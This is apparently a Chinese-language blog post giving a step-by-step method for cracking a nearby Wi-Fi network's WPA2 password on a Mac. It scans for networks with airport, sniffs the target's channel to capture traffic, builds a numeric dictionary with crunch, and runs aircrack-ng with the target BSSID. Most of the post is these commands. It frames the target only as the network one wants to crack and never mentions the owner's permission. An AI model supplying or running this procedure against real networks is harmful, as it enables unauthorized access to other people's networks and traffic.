---
layout: post
title: Mac上使用aircrack-ng破解Wi-Fi密码
tags: [mac, aircrack-ng, Wi-Fi]
categories:
  - 技术互联
---

## 使用Airport获取附近可用Wi-Fi　

　　MacOS自带的命令可以获取附近Wi-Fi的详细信息。首先我们需要把命令加到环境变量中：

```
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

　　然后通过`source ~/.zshrc`或者重新打开终端即可使用`airport`命令：

```
sudo airport -s
```

　　命令结果显示出附近可用的Wi-Fi信息，如下所示：

```
	SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
 ******* **:**:**:**:**:** -50  153     Y  CN -- WPA2(PSK/AES/AES)
ChinaNet **:**:**:**:**:** -46  11      N  CN NONE
...
```

　　其中，我们先找到我们需要破解的Wi-Fi名字，纪录下来BSSID，CHANNEL和SECURITY信息，后面会用到。BSSID就是我们目标Wi-Fi发射器的Mac地址。

## 开启信道监听

　　首先我们要获取Mac本机无线网卡名字，通过键入`ifconfig`分析可以得到。我本机无线网卡的名字`en1`，下面的命令需要替换成自己对应的无线网卡名称：

```
sudo airport en1 sniff 11
```

　　命令中的11就是我们在之前获取附近Wi-Fi信息所记录目标Wi-Fi的信道。如果一切顺利的话，会生成`/tmp/airportSniffy*.cap`文件纪录捕获的传输数据。这个文件地址也需要纪录下来，后面会用到。

## 安装aircrack-ng、crunch 

　　使用`brew`包管理器安装就可以，也可以选择下载源码自己编译安装。

```
brew install aircrack-ng
brew install crunch # optional
```

　　crunch 是一个自定义字典生成器，如果有现成的字典则不需要。crunch 生成长度为8的纯数字字典并存入 dic.txt 示例如下：

```
crunch 8 8 012345678 -o dic.txt
```

## 开始破解

　　由于现在的Wi-Fi基本上都是采用WPA2的加密方式，所以我们需要指定 -a 参数为2。

```
aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b **:**:**:**:**:** /tmp/airportSniff*.cap
```

　　参数说明：

    - \-w 指定字典文件
    - \-M 指定最大IVs，根据提示可以适当调大次参数
    - \-f 暴力破解因子，默认2，也可适当调大
    - \-a 加密类型，1:WEP, 2:WPA-PSK
    - \-b BSSID，刚刚纪录目标Wi-Fi的Mac地址
    
    更多参数说明可以通过`aircrack-ng --help`查看。
    后面紧跟之前纪录的捕获数据的存储地址即可。如果在字典里面找到的话，可以看到如下画面：

![Crack SuccessFully Image]({{ site.image_url }}/aircrack-ng/success.png)

    注：因为 aircrack-ng 是破解捕获数据的，所以所破解的Wi-Fi必须要有设备连接，并且有网络通信，否则无法破解。

## 参考目录

- [1] [Aircrack-ng Wiki](https://www.aircrack-ng.org/doku.php?id=Main)
